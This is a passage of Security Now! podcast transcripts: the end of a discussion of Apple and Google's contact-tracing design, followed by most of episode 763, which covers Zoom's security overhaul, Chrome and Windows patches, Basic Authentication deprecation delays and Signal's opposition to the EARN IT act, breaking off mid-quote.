So we do, I mean, if nothing else, the Zoom fiasco, the Zoom startup fiasco has shown that the social engineering side also needs to have attention paid to it.  We've nailed the technology side.  So I don't know how we'll handle that.  It needs to be done correctly.  But we really do have a beautiful technical solution, I think.  There's no notion of user identity.  It's not encoded.  It's not encrypted.  It just isn't there.  These things are coming out of HMAC, and it's just random gibberish.  There's no sense of location, that is, the protocol...



LEO:  So it's not related to - you can't derive the randomly generated MAC addresses from this HMAC.  That was one of Moxie Marlinspike's concerns was all of a sudden somebody tests positive, he's going to have - it's going to publish all of his rotating Bluetooth MAC addresses to the world.



STEVE:  So there's two different things here.



LEO:  I know there's these derived ones.



STEVE:  Well, so there's the MAC address, and that's separate from the payload of the Bluetooth packet, the rolling proximity identifier.  That's the data contained by the Bluetooth packet.



LEO:  But that has to be able to link back to the person who generated it at some point, if you test positive.



STEVE:  Yes, correct.



LEO:  So you must be able to derive the MAC address from that.



STEVE:  Not the MAC address.  Again, you need to - the MAC address is different from the rolling proximity identifier.  The MAC address is the communications link.  The rolling proximity identifier is the 128-bit tag carried in the payload.



LEO:  And that's generated randomly.



STEVE:  Well, that's generated through this HMAC, which is clever because it allows them to be recreated from the daily tracing key, which is then called the diagnosis key.



LEO:  But it's a one-way transmission.



STEVE:  Yeah, it is a one-way function.  But again, you put the same thing in, you're going to get the same thing out, which is the elegance of this, because it means you just post your diagnosis keys, the keys for the days that you were contagious, and everybody who receives those can then regenerate the whole day's worth of rolling proximity identifiers to see if they have any collisions, if they have any matches.



LEO:  So he says the moment you test positive - he misunderstood it.  He says all of your BTLE MAC addresses over the previous period become linkable.



STEVE:  Yes, that is not true.



LEO:  That is not the case, okay.



STEVE:  Yep, not the case.



LEO:  That would certainly be an issue, obviously, because the reason you rotate this - because it's a privacy issue.



STEVE:  Yup, and it's also very clear that Apple and Google knew this because they deliberately made the 10-minute period on the inside of when the MAC address rotates or changes.  So there is just absolutely - oh, and they also made them change synchronously, and the spec specifically says that.  So I just think that Moxie, you know, maybe he, I don't know, had a bad hair day.  You've seen him, so that's not much of a stretch.  Who knows?  But yeah, there is no MAC address linkability.  They really nailed the technology.  It's beautiful.



LEO:  Right, okay.



STEVE:  So we need to solve the social engineering problem.  We need not to allow people to post to what will what become an important tracing database if they aren't actually recently shown to be positive.  But, you know, that could be under the control of local health officials.  And we don't yet know how they're going to be distributing or managing antibody testing.  But the cool thing is you can't have tracing unless you have the technical foundation.  To their credit, Apple and Google instantly stepped up and created, as far as I can see, a perfect technology base on which can be built the tracing that we probably need throughout the world moving forward.



LEO:  Yeah, it's clever.  They say that Apple and Google will push out these APIs in the next couple of weeks, or mid-May, I guess, so it's about a month from now.  And so they'll be available to apps at that point with operating system updates.  And then apps will come later from those two.  There'll be reference apps both from Apple and Google.



STEVE:  Oh, I mean, I could write this overnight.  I mean, it's really simple.  And that's what you want.  You want a clean, simple, obvious, obviously provably correct system.  And they nailed it.



LEO:  That's the best place to start, yeah.



STEVE:  Yeah.



LEO:  Well, I'm relieved.  That seems good.



STEVE:  And there we have a podcast.



LEO:  Very interesting.



STEVE:  And all of our listeners know how it works now.  And I have a feeling it may be in our lives in the future, yeah.



LEO:  It's very elegant, yeah, it's very elegant.  Yeah, I think it's very interesting.



Steve Gibson's at GRC.com.  That's where the podcast lives, as well.  GRC is the home for SpinRite.  That's that thing he's working on, SpinRite 6.1.  You'll find the world's best hard drive maintenance and recovery utility at GRC.com, along with a lot of other freebies including ShieldsUP! and of course this show - 16Kb audio, 64Kb audio, and very nicely done transcriptions, all available at GRC.com.



We have 64Kb audio and video, as well, at our website, TWiT.tv/sn.  It's also on YouTube.  You could subscribe to the Security Now! channel there.  And if you will, subscribe to the podcast.  That way you'll have every episode.  You won't have to think about it.  Just pick a podcast appliance and subscribe.  You can even listen on Amazon's Echo - that's not a subscription, but you can listen - or the Google Home just by saying, you know, "Hey, device, play Security Now! podcast," and it will.



Steve, we'll be back here next Tuesday around 1:30 Pacific, 4:30 Eastern, 20:30 UTC for another thrilling, gripping, sassy edition of Security Now!.



STEVE:  Absolutely.  Today was Patch Tuesday.  Not enough time to deal with all that.  We'll figure out...



LEO:  Was there a patch?



STEVE:  Oh, yeah, I got my Win10 system is, like, panting for me to shut it down so it can update.  So, like, okay.  Hold your horses.



LEO:  Talk about it next week.



STEVE:  Gonna happen right now.  Talk to you then, my friend.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#763

DATE:		April 21, 2020

TITLE:		The COVID Effect

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-763.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week, as an interesting case study, we continue tracking the latest actions being taken by Zoom, and share another unfortunate consequence of their overnight success.  We have two pieces of Chrome browser news.  Our security news includes what happened with last Tuesday's Windows patches, rollbacks in authentication plans, Signal's reaction to the planned EARN IT act, trouble at the Tor Project, and an interesting CAPTCHA change at Cloudflare.  I also want to share my recent change in preferred VM platforms and two bits of listeners' closing-the-loop feedback.  We end with a SpinRite update, since stuff's beginning to happen!



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here, and there's lots to talk about, including all the things Zoom is doing right to protect security.  Our favorite polar bear hacker has a new job.  Congratulations!  And then we're going to talk a little bit about 113 patched flaws - yes, our Patch Tuesday report - coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 763, recorded Tuesday, April 21st, 2020:  The COVID Effect.



It's time for Security Now!, the show where we, boy, more than ever protect you against all sorts of little beasties out there on the Internet.  This is the guy with the shield, the sword, the face shield, the mask, everything.  Steve Gibson of GRC.com.  Hi, Steve.



STEVE GIBSON:  Hey, Leo.  Great to be with you again.  You're talking about - I was thinking about my moustache because I have...



LEO:  Well, that, too, yeah.  It's a filtration device.



STEVE:  I have two high school buddies who are both MDs, and so they're both feeling the effects professionally of this coronavirus and the COVID disease.  And one of them shaved, had had a goatee, like, forever.



LEO:  Yeah, yeah.



STEVE:  And shaved it off because they just...



LEO:  Facial hair's not good.



STEVE:  Yes, they wanted less places for the virus to perch.  And speaking of COVID, this is Security Now! Episode 763.  And COVID and its effects on our society, as we've already been seeing, we've been talking about it, is having an impact everywhere.  And I realized that the thing that glued all of these various security stories together this week was aspects of COVID.



LEO:  Yeah.



STEVE:  So I just titled this "The COVID Effect."  Not because it's about anything in particular, but it's affecting everything.  So there is no big single topic.  We're going to talk about, whoa, boy, we have the best Picture of the Week.  Our listeners are not going to believe what happened.  We also have, really as an interesting case study, we're going to continue tracking the latest actions being taken by Zoom.  I bet you it'll end up being a business school study of how a company should react to what has happened to them.  We also have an unfortunate consequence of their overnight success.  We've already seen a few.  Here's another one.



We've got two pieces of Chrome browser news, and security news including what happened with last Tuesday's Windows patches; rollbacks in authentication plans; Signal's reaction, the Signal company's reaction to the planned EARN IT act that we've touched on once before; trouble at the Tor Project; and an interesting CAPTCHA change at Cloudflare.  I also want to share my recent change in preferred virtual machine platforms.  I've fallen in love with one that surprises me.  We've got two bits of listeners' closing-the-loop feedback, and I've got a SpinRite update since stuff's beginning to happen.



LEO:  Ooh.



STEVE:  So I think our listeners will be interested in all of that stuff.



LEO:  That's the best tease of all.  Love hearing that.  That's great.  Well, we have a great show for you planned, as always, thanks to Steve Gibson.  Steve?



STEVE:  So our Picture of the Week.  I missed this, and it was from a comment that I saw somewhere in the security machinations online, talking about the probable reason that we had been seeing so many more-serious-than-usual bugs being fixed by Microsoft.  The news is that SandboxEscaper, who we have covered extensively in the past, remember she has that really cool - she likes, well, she calls herself a polar bear.  She likes solo camping in, like, Antarctica or crazy snow places; has this cool little single-person tent thing.



Anyway, she also, from her prior tweets, I mean, sort of seemed like a malcontent, maybe struggling with depression or, you know, I don't know what.  But an incredibly gifted developer, hacker.  We know that because of all of the grief that she was putting Microsoft through last year, finding problem after problem after problem in the Windows kernel.  Anyway, she tweeted:  "Goals for 2020:  Become the best programmer at Microsoft so people don't regret hiring me."



LEO:  Awesome.  Awesome.



STEVE:  "Meet other bears.  Have more CVEs than the haters.  Run to work every day, do lots of exercise, and defeat depression forever."



LEO:  Good, good.



STEVE:  And then a little bear emoji.



LEO:  Aww, that's great.



STEVE:  So they had the wisdom to track her down and say, hey, you know, we'd like to have you work on our side.  Because, you know, she was just letting these things go.  I mean, she was publishing zero-days.  And it was like, ooh, ooh, ooh, ooh, ooh.  So now she's fixing them rather than them being zero-days.  And so, yes, last Tuesday we had 113 things that needed to get patched in Windows.  But we'll get to talking about that in a second.  So but anyway, I just wanted everyone to know that our friend of the podcast, SandboxEscaper, got hired, which is just a win for everybody concerned, certainly we users and both, I'm sure, she and Microsoft.  So neat.  Congrats.



As I said at the top, I think it's quite instructive from a security viewpoint to watch how Zoom deals with all of the various consequences of the overnight explosion in the popularity of their platform, even though it had been around since 2011.  If their response had been lame, it wouldn't be interesting.  But so far they've been anything but lame.  Their response has been very impressive.  And the past week brings us some even more impressive news.  Last week they announced that they had hired Luta Security, which was founded by Katie Moussouris, a well-known cybersecurity veteran.  Katie created some of the most important vulnerability programs still running today.  She started Microsoft's Vulnerability Research and Symantec's Vulnerability Research.



LEO:  She's really good.  I'm so thrilled to hear this.  This is great.



STEVE:  Yes.  And the bug bounty programs for Microsoft and the Pentagon.  She has been given a free hand to rebuild Zoom's existing security program, which had previously been based on HackerOne.  So she's now taking input from across the entire cybersecurity community, seeking any ways, all suggestions welcome, to improve Zoom's vulnerability disclosure process.  In her own posting about this new assignment, last week she wrote:  "No company can bug bounty their way to being secure, and we at Luta Security emphasize building strong internal engineering to reduce the number and severity of vulnerabilities before software is released, as well as being..."



LEO:  What a concept.



STEVE:  What an idea.  Who woulda ever thunk about that?



LEO:  Who'd have thought?



STEVE:  Yeah.  And she said:  "...as well as being capable of fixing bugs efficiently when they do slip through security development practices.  When the pandemic hit, we were already wrapping up a full internal vulnerability coordination and management maturity assessment against ISO 30111 with Zoom."  Which is interesting.  I didn't realize.  I mean, Zoom was already, before this was happening, saying we want to be proactive about this.  So they were already there.



So she said:  "So that's where the real change has to happen - internally.  One of the five capability areas Luta Security measures is organizational.  This is the executive will to change company culture, which we are all fortunate enough to witness with Zoom in real time."  She said:  "It's putting effort into investing properly in security and privacy, not just with words, not just by bringing in big names in security or jacking up bug bounty prices in a frenzy to create the appearance of diligence."



She said:  "That being said, increased transparency from the many experts who are working together with Zoom to bring the very best security help gives the folks watching this effort a chance to see changes unfold."  She finishes:  "In cases like Luta Security's work with Zoom, we now get to ask the public for feedback on Zoom's bug bounties."



And then I asked, who were these big names in security Katie was referring to?  Her follow-on tweet last Thursday read:  "I'm excited to highlight my colleagues who are adding their expertise in the next few weeks.  In addition to welcoming my former colleague @alexstamos" - who we spoke of last week - "to the extended Zoom security family, I'd like to welcome" - and then we have a series of twitter handles:  "@LeaKissner, @matthew_d_green, @bishopfox, @NCCGroupInfosec and @trailofbits."  She tweeted that on the 16th.



So Lea Kissner was the former global lead of privacy technology for Google.  We all know cryptographer and Johns Hopkins professor Matthew Green.  He's now on the team.  And then there are three well-known security auditing firms:  Bishop Fox, the NCC Group, and Trail of Bits.  So perhaps some auditing is in the works, as well, as I was saying last week I hoped would also be happening.



So to maintain a high degree of operating transparency, Zoom's CEO, Eric Yuan, has started hosting a weekly "Ask Eric Anything" webinar.  During last week's webinar we learned a few more things.  He shared during this a "past week" and "next week" timeline, basically everything we've covered in the past week -changing defaults, hiding the meeting ID, the security icon added to the toolbar, disabling or disabled renaming participants, cloud recording, Zoom chat, dashboard enhancements, and also password complexity, something we hadn't talked about before.  And they're adding a few more things going forward.



Account owners and admins can now configure minimum meeting password requirements to include numbers, letters, special characters, allow only numeric passwords.  In the past it was possible just to use a number.  So now they've made passwords much stronger.  And free basic account users will now also be able to use alphanumeric passwords by default, rather than numeric passwords.



Last Saturday account admins acquired the ability to choose to have their data routed through specific datacenter regions geographically, giving them control of their interactions with Zoom's global network.  This feature is intended to help with fears that Zoom chats and encryption keys might be spending some time over in China.  So admins can override that nonspecific behavior and specify where they want things to go.  And then on Sunday, two days ago, the system added the ability to report abusive users so that Zoom can shut down accounts engaging in Zoom bombing.  And that's a very quick automated process where you can just tag somebody who is Zoom bombing, and Zoom will immediately be able to take some measures in order to thwart them.



And then, during the same webinar, Alex was present, Alex Stamos, and he announced that in a matter of weeks they'll be moving from Zoom's currently, it's probably fair to call it barely adequate call encryption, to a more widely tested and trusted solution.  Specifically, Alex said that Zoom will be  moving away from the current AES-256 ECB - remember that's the Electronic Code Book encryption - to a more secure AES-256 GCM encryption, which by the way is what SQRL uses to encrypt its identities.  So that is a good choice for them to jump to.  And Alex also noted, he said:  "The long-term focus will involve a totally new cryptographic design that greatly reduces risk to Zoom's system."



So to me, Zoom's response looks like a business management school case study in the proper way to engage and manage the explosive growth of a highly used, highly targeted, and inherently abuse-prone online facility.  So again, I say bravo to Zoom.  I just think they're doing everything right.



But there is always a dark side.  Meanwhile, more than 500,000  Zoom meeting IDs and passwords are currently for sale.  Apparently someone's been sucking them up using automated bots on the 'Net.  And as we know, there's also been - there was essentially a robo dialer that was able to look for Zoom meetings based on ID and was finding a handful every hour.  The price is not very high for these meeting IDs and passwords, apparently about a tenth of a cent, a U.S. cent each.  To no one's surprise, a black market for Zoom meeting IDs and passwords has quickly sprung into existence.  And we can assume since the price is so low that even the seller knows there's not much value there.  The credentials are gathered through credential stuffing attacks and just scraping social media for any mention of IDs and passwords.



LEO:  Yeah.  So almost certainly worthless.  Every meeting we do is a new ID.  So unless you had a standing meeting, and you never bothered changing the ID or something, it's worthless.



STEVE:  Yes.  Unless that was completely static.  But on the other end of the pay scale, Motherboard reports that people who trade in zero-day exploits are sure there are two Zoom zero-days, one for Windows and one for macOS, currently on the market at an asking price of half a million dollars.  So, yes, IDs and passwords are worthless.  These guys - although informed people believe that's still very overpriced.



So here's what we know.  Hackers are selling two critical vulnerabilities for Zoom which would allow someone to hack users and eavesdrop on their calls.  According to three independent Motherboard sources who are knowledgeable about the market for these kinds of hacks, one each reportedly exists for the Zoom client for Windows, and another for the Zoom macOS client.  The sources had not seen the code for the vulnerabilities but have been contacted by brokers offering them for sale.



Motherboard had previously reported that there had been a sudden increase in interest in zero-days for Zoom after, as we know, hundreds of millions of people, including employees and executives at big companies around the world, had moved onto the platform and were conducting sensitive and in some cases confidential meetings.  A guy named Adriel Desautels, the founder of Netragard, a company that used to sell and trade in zero-days, said from what I've heard, he said, there are two zero-day exploits in circulation for Zoom.  One affects macOS; the other Windows.  He added:  "I don't expect that these will have a particularly long shelf life because when a zero-day gets used, it gets discovered."



Two other independent sources who asked to remain anonymous so they could discuss the sensitive topic confirmed the existence of these two exploits on the market.  One of the sources, a veteran of the cybersecurity industry, told Motherboard:  "The Windows zero-day is nice, a clean remote code execution, perfect for industrial espionage."  The zero-day for Zoom on Windows, however, would allow hackers to access the app, but would need to be coupled with another bug to access the whole machine.  So it sounds like it would need to be joined with probably a privilege elevation bug in order to do more.  The macOS flaw is not a remote code execution, according to two anonymous sources.



So as I noted at the start, the asking price for these is half a million dollars.  According to one of the sources who deals in the procurement of exploits, but has decided not to purchase this one, that source said:  "The exploit requires the hacker to be in a call with the target, making it much less valuable for a government spy agency that is hoping to be stealthy and doesn't want to get caught."  To me, this guy sounds like a vulnerability reseller like Zerodium.  He also told Motherboard that he estimated the exploit was worth about half the asking price in terms of what the market will bear.  And the macOS, as I said, is not a remote code execution, making it less dangerous and harder to use in a real hack, according to two other anonymous sources.



So as for Zoom, especially with their current very vigilant posture, you can imagine they're not taking this news lying down.  When asked, they said:  "Zoom takes user security extremely seriously.  Since learning of these rumors, we've been working around the clock with a reputable, industry-leading security firm to investigate them."  They said:  "To date, we have not found any evidence substantiating these claims."



So of course that's what they're going to say.  To me this sounds very credible, given the fact that it's multiple sourced and, if we believe the sources, they've had a chance to vet them and decide if they're worth, like how much they're worth, decided they were not worth a half a million dollars.  So anyway, that's what's going to happen when there's something with this much overnight popularity.  And Zoom is, as we know, scrambling to shore up its security.  To that end, though, you'd have to say they are taking all the right measures.  So tip of the hat to these guys.  I really do think...



LEO:  You're right, I mean, this is almost, this is a textbook example of how you solve this.



STEVE:  Yes.  Yes.



LEO:  I mean, it gives me huge confidence in them.  Frankly, they're probably safer than almost anything else once this is complete.



STEVE:  I agree.  They've got the best experts in the industry.  It looks like they will soon be announcing a formal audit throughout their system and architecture.  And with Matt Green in there, and Alex, they're probably going to have someone who they trust take a look at their code.  I mean, that's already apparently happening on some level, at least at the API level, and say, okay, here's the things we need to fix.  So I agree with them.



LEO:  Super smart because here's their opportunity; right?  



STEVE:  Yes.



LEO:  Everybody's using them.  And if you can give people confidence and say, look, we have stuff that no - we're more secure than anybody else, you know, I don't think any other conferencing system is undergoing audits, security audits right now.  I don't know of anything like that.



STEVE:  No, no.  And in fact, in the coverage of this, and I didn't add this to my discussion, but all of the articles say we still recommend it.  That it is better to have something which is easy to use, and so the adoption friction is low, which is being fixed literally as we speak.



LEO:  Yeah, yeah.  You're not sharing state secrets.  It's probably okay.



STEVE:  Yes, exactly, exactly.  We've got two bits of news regarding Chrome.  Google just updated all three desktop platforms - Windows, Mac, and Linux - to 81.0.4044.113 to squash a critical flaw that existed in earlier versions.  Unfortunately, that's both the short and the long version of the story, since Google is saying nothing more.  They wrote, as they do:  "Access to bug details and links may be kept restricted until a majority of users are updated with a fix.  We will also retain restrictions if the bug exists in a third-party library that other projects similarly depend upon, but have not yet fixed."



What little we do know is that Google was made aware of the problem by researchers at Qihoo 360's Alpha Lab, and that it addresses the Critical CVE-2020-6457, which is described as a use-after-free vulnerability that exists in Chrome's speech recognizer.  So we don't know whether you need to be spending a lot of time talking to your browser for this to grab a hold of you, or whether a malicious website might have been able to leverage the flaw on any page that you visited.  When I looked, that was the version of Chrome I was already using.  And so I imagine that by now everybody already has it.  Whether you're talking to yourself or talking to your browser, you're probably safe.  I tend to talk to myself.



LEO:  Yes, but your browser's listening, don't forget.



STEVE:  It might be busy translating it, yes.  And something else turned out to be different than was planned in Chrome 81.  Chrome has undeprecated FTP, of all things.  We've talked about this a couple times already.  For the past six years, since 2014, Google had been wanting to eliminate support for FTP in Chrome.  I mean, really, who do you know?  I mean, my super geeky friend Bob, who has unfortunately left this mortal coil some time ago, I remember seeing him putting ftp:// into a browser.  And I said, "Really, Bob?"  And he says, "Well, it's the best."



LEO:  No, it's not.  I actually own FTP clients; you know?  I wouldn't use a browser for this.  If you use FTP, why wouldn't you have a client?



STEVE:  That's exactly right.  There are much more feature-complete useful FTP clients.



LEO:  Yes.



STEVE:  Anyway, so they found that between 0.1 and 0.2% of the browser's users, and I should say slightly higher on the Unix platform...



LEO:  Well, of course.  It's because we're smart.



STEVE:  ...were using FTP.  And again, there are way more feature-embellished FTP clients available.  By the end of 2018, Google had moved FTP into the "won't fix" category in Chrome for iOS and began the march to slowly deprecate FTP support on their desktop browsers, as well.  We talked about this at the time, with Google writing, and our listeners will probably recall that Google wrote:  "FTP is a nonsecurable legacy protocol."  They said:  "We've 'won't fixed' FTP support on iOS, but its usage in Blink-based Chrome is high enough that it seems difficult to remove it all at once.  This seems like a reasonable way of reducing its visibility as an attack surface as a stepping stone to more complete removal."



What they're referring to as "reducing its visibility" was their plan to continue displaying FTP directory listings, but no longer render files in the browser, only allow users to download them by clicking on a link in an FTP directory in your browser.  Again, really?  So with Chrome 80, which as we know was released a couple weeks ago, Google added an "Enable FTP" flag to control whether or not any FTP support would be present.  It was still enabled by default, but Google used the flag to conduct a test where it was turned off for 1% of its user base to see whether anyone noticed or complained.  The plan was to finally disable FTP support by default in Chrome 81, but still allow it to be enabled again using its #enable-ftp flag.  But then COVID 19.



So on April 9th Google software engineer, let's see, it's Asanka Herath, posted to the "Remove built-in support for FTP from Chrome" Chromium bug topic that:  "In light of the current crisis, we are going to 'undeprecate'" - and I had to force my spell checker to accept that - "FTP on the Chrome..."



LEO:  "Undeprecate" is a rarely used word, I'm guessing.



STEVE:  Yes, "...undeprecate FTP on the Chrome stable channel.  In other words, FTP will start working again.  As with support for TLS 1.0 and 1.1, FTP support [fanfare sound] is being restored by default."



LEO:  Undeprecated.



STEVE:  I know, to make sure there will be no problem with people accessing content on FTP sites during the pandemic.  Turns out, for instance, many government agencies still utilize FTP sites, including the - wait for it - National Institutes of Health, the NIH.  So Asanka Herath stated that this momentary reversal of FTP's deprecation, thus undeprecation, would endure until things were back to normal, and people were in a better position to deal with potential outages and mitigations and migrations and so forth.  So yes, thus sticking with our theme, COVID.



Last Tuesday was our late-in-the-month Patch Tuesday.  And it's a good thing that all Windows 10 users will have by now installed this month's Patch Tuesday updates and rebooted because everyone who did eliminated 113 notable...



LEO:  You're kidding me.



STEVE:  Yeah.  Oh, talk about fixing it after you've shipped it.  How old is this?  Oh, my lord.  Nineteen of them were rated critical, existing in Windows and related software.  And that crop of 113 problems included three critical zero-day flaws that Microsoft was aware of being actively exploited in the wild.  The uncomfortable news for those of us who have chosen for whatever reason to continue using Windows 7, is that these three zero-days, and many other problems that are also present in our beloved Windows 7, unless you've got Extended Security Updates, will remain unpatched forever.



LEO:  Oh, that's - see, it took a while for this to happen with XP, but it's happened right away with Windows 7.



STEVE:  It has happened right away, yes.



LEO:  That's interesting.



STEVE:  Because Microsoft just cannot keep their hands off of their operating systems.  



LEO:  Well, that's probably a good thing.



STEVE:  Yeah.



LEO:  I mean, they seem to need some hands-on, a little TLC.



STEVE:  Boy.



LEO:  Geez. 



STEVE:  Yeah.  Two of the zero-days found being exploited in the wild were in Adobe's Type Library.  We've already talked about one of those before, where we suggested temporarily disabling, renaming, or deleting, if you can, the offending Windows DLL.  The problem with those rather heavy-handed moves was that some other somewhat important pieces of Windows like Media Player were dependent upon the offending DLL.  An alternative for Windows 7 users was to consider subscribing to the micropatch service, that 0patch.com service, which would have these fixes deployed on the fly.  So that's still a possibility.  I'm going to trust Defender, which happily is still being updated on my Windows 7 machine.  And unfortunately switching to 10 is not a simple thing.  It requires - I guess I could make an image and then try upgrading to 10 and just hold my breath that, like, everything would still work.



LEO:  If your hardware isn't superannuated, it should probably work.



STEVE:  Yeah, and it isn't.



LEO:  Really, the only issue is drivers.



STEVE:  Right, right.



LEO:  And the nice thing is, after you do that, you can always roll back because they do give the rollback.



STEVE:  Yeah.  I might consider that.



LEO:  I think you might have to at this point.



STEVE:  And I'd have an image so I could always just say, oh, boy, if the rollback failed.



LEO:  Right.  No, I would certainly do that, yeah.



STEVE:  Yeah, yeah, yeah.  The third zero-day was a Windows kernel elevation privilege vulnerability that, being a zero-day, was found by Google's Project Zero being used in the wild.  This one only rates as important, presumably because it doesn't allow for remote code execution.  But as we know, privilege elevation vulnerabilities can be combined with other flaws to create a much more powerful attack, so it ought not be ignored.



There's also been some question in the security community about whether there might actually have been a fourth zero-day vulnerability fixed this month.  But it appears that the advisory for the critical IE flaw, which was CVE-2020-0968 - which is interesting because that's a low number, so they've known about that for a while - was revised to indicate that Microsoft was not yet receiving reports and had no knowledge of it being exploited in the wild.  Nevertheless, the advisory says this IE bug is likely to be exploited soon, and that would not be good since it's a scripting engine memory corruption vulnerability existing in IE.



Microsoft explains that a remote code execution vulnerability such as this exists in the way the scripting engine handles objects in memory.  The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user.  On the other hand, IE.  So, yeah, I mean, the danger is that there are things, as we know, that manage to invoke IE sort of behind the scenes.  And that's the way the Adobe type flaw was still being used was in IE.



So anyway, it's good to get these things fixed.  Also of note was another low numbered 2020-CVE-0796.  If that number rings a bell, it's because that's the CVE for that Windows SMBv3 client-server remote code execution vulnerability, which prompted me in the middle of March to comment that Microsoft has just never been able to create a secure Internet-facing server, not only remote desktop protocol, but Windows file and printer sharing.  This was the one that really had Microsoft freaked out and worried.  They called it a "wormable" pre-auth remote code execution vulnerability.



And Microsoft released an emergency out-of-cycle patch in the middle of last month because they were unable to wait until this month's very late in the month Patch Tuesday, after a handful of public proof-of-concept exploits appeared.  And although none of those has successfully performed the dreaded remote code execution, yesterday, April 20th, researchers at Ricerca Security demonstrated exactly that.  So it's a good thing it had been fixed the week before and that all Windows 10 users were now immune to it.



And in more "we changed our minds because of COVID-19" news, known as Basic Authentication and originally specified in an RFC 2617, which was published back in June of 1999, so 21 years ago, Basic Authentication is a dead simple method of providing HTTP authentication for an online web app or a web browser page by simply adding the HTTP query header "Authorization:" followed by the one-word token "Basic" and a Base64-encoded username and password where the username and password are concatenated by a colon.  The Base64 encoding wasn't meant to obscure it because it barely does.  I mean, it's easy to Base64 decode.  It was just so that the username and password could contain anything that they wanted to, and that wouldn't confuse the server receiving this query with other HTTP-ish things.



So anyway, the point is that this was simple and convenient because rather than any sort of back-and-forth handshaking or sticky state created by cookies, this simple query contained and asserted the application's credentials for making the query.  In a single query it just says "This is who I am, and this is what I want."  And once upon a time, without HTTPS, doing this would have been horribly insecure since there's no cryptographic challenge and response, nor even any encryption of the credentials, just a static assertion of the requester's identity, basically in plaintext.



So today, 21 years later, there are myriad ways of accomplishing the same goal with far more security, with OAuth 2.0 currently being the industry's favorite.  So the use of this seriously old Basic Authentication has been falling by the wayside for a long time.  Given TLS authentication and encryption, it's better.  But no, nobody should be using it now.



Way back in, well, two years, way back in July of 2018, Microsoft announced it would be switching off support for Basic Authentication in its Exchange Web Services (EWS), that's the API for Office 365, and it planned to turn off support for the entire feature on October 13th, 2021.  So about a year and a half from now.  Google also committed to turning off Basic Authentication in December 2019, so five months ago.  Google warned that it would deny what it called "less secure apps" access to its backend services, favoring OAuth 2.0 instead.  That was meant to happen two months from now on June 15th of 2020.



But COVID-19 happened, and now both companies have reconsidered and changed their plans in the interest of giving their online users more leeway as they cope with the COVID-19 chaos.  Earlier this month, on April 3rd, Microsoft said it would postpone the deprecation of Basic Authentication for Exchange Online for those tenants using it, keeping it available until at least the second half of 2021.  And Google also announced at the end of March that it will defer its Basic Authentication switch-off until further notice.  But as I said, anyone still using Basic Authentication really should be reading the handwriting on the wall and move to a much more secure authentication.  And there's a lot of support now for OAuth 2.0, which is what both companies are now recommending as their preferred authentication flows.



All right.  Sad to go from a nice high note to this, but we need to talk about this because it may be affecting us all.  I think I used the word "despicable" when we first introduced this horrific pending legislation to our audience.



LEO:  Oh, EARN IT, ugh.



STEVE:  It's despicable because it's employing an underhanded backdoor means for attempting to force encryption companies to alter their technologies to make them subpoena compatible.  Joshua Lund is a developer and spokesman for Signal whom we've quoted a couple times in the past.  Signal, as we know, is arguably the best and most securely designed end-to-end encrypted messaging solution.  And not surprisingly, it's not only Zoom that has recently experienced a massive pandemic-driven adoption rush.  In this context, Josh has recently spoken out about this EARN IT act.  And I wanted to share Signal's position on this.



He writes:  "Over the past several weeks, Signal traffic has gone through the roof.  New users are signing up at unprecedented rates, and we've expanded our server capacity faster than ever anticipated.  It means a lot to us that so many people are relying on Signal during this difficult time.  When users check in on their families, share moments of solace, smile with their friends, or discuss sensitive health issues with their doctors, Signal's end-to-end encryption and privacy-preserving technology helps keep this information secure.



"At a time when more people than ever are benefiting from these protections, the EARN IT bill proposed by the Senate Judiciary Committee threatens to put them at risk.  COVID-19 has us sheltering in place, but we cannot quarantine our concerns.  Broadly speaking, Section 230 of the Communications Decency Act protects online platforms in the United States from legal liability for the behavior of their users.  In the absence of this protection, many of the apps and services that are crucial to the way the Internet functions today may have never been created in the first place, or they couldn't have been created in America.



"The EARN IT act turns Section 230 protection into a hypocritical bargaining chip.  At a high level, what the bill proposes is a system where companies have to earn Section 230 protection by following a set of designed-by-committee 'best practices' [he has in quotes] that are extraordinarily unlikely to allow end-to-end encryption.  Anyone who doesn't comply with these recommendations will lose their Section 230 protection.



"Some large tech behemoths could hypothetically shoulder the enormous financial burden of handling hundreds of new lawsuits if they suddenly became responsible for the random things their users say, but it would not be possible for a small nonprofit like Signal to continue to operate within the United States. Tech companies and organizations may be forced to relocate, and new startups may choose to begin in other countries instead.



"For a political body that devotes a lot of attention to national security, the implicit threat of revoking Section 230 protection from organizations that implement end-to-end encryption is both troubling and confusing.  Signal is recommended by the United States military.  It is routinely used by senators and their staff.  American allies in the EU are Signal users, too.  End-to-end encryption is fundamental to the safety, security, and privacy considerations worldwide.  Proponents of this bill are quick to claim that end-to-end encryption isn't the target.  These arguments are disingenuous both because of the way that the bill is structured and the people who are involved.



"Riana Pfefferkorn, Associate Director of Surveillance and Cybersecurity at the Stanford Center for Internet and Society, wrote a detailed breakdown of some of the myriad problems with this bill.  She also astutely points out that the bill would give unprecedented power to Attorney General William Barr, a vocal critic of end-to-end encryption, who would become the arbiter of any recommendations from the 'best practices' commission that the EARN IT bill creates.



"It is as though," he writes, "the Big Bad Wolf, after years of unsuccessfully trying to blow the brick house down, has instead introduced a legal framework that allows him to hold the three little pigs criminally responsible for being delicious and destroy the house anyway.  When he is asked about this behavior, the Big Bad Wolf can credibly claim that nothing in the bill mentions huffing or puffing or the application of forceful breath to a brick-based domicile at all.  But the end goal is still pretty clear to any outside observer."



And Josh concludes with an "It's not too late" message.  He says:  "As billions of conversations transition online over the coming weeks and months, the widespread adoption of end-to-end encryption has never been more vital to national security and the privacy of citizens in countries around the world.  Bad people will always be motivated to go the extra mile to do bad things.  If easy-to-use software like Signal somehow became inaccessible, the security of millions of Americans, including elected officials and members of the armed forces, would be negatively affected.  Meanwhile, criminals would just continue to use widely available, but less convenient, software to jump through hoops and keep having encrypted conversations."



